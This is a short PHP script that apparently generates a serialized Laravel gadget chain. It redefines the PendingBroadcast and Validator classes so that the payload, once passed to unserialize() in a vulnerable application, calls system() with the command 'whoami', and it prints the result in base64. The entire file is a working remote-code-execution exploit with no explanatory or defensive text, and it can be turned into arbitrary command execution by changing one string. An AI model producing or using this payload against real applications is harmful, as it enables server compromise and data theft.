<?php

namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        function __construct($class, $parameters)
        {
            $this->events = $class;
            $this->event = $parameters;
        }
    }
}


namespace Illuminate\Validation
{
    class Validator
    {
        public $extensions = [];
        function __construct($function)
        {
            $this->extensions = array(
                "" => $function
            );
        }
    }
}

namespace {
    $validator = new Illuminate\Validation\Validator("system");
    $pendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($validator, "whoami");
    print_r(base64_encode(serialize($pendingBroadcast)));
}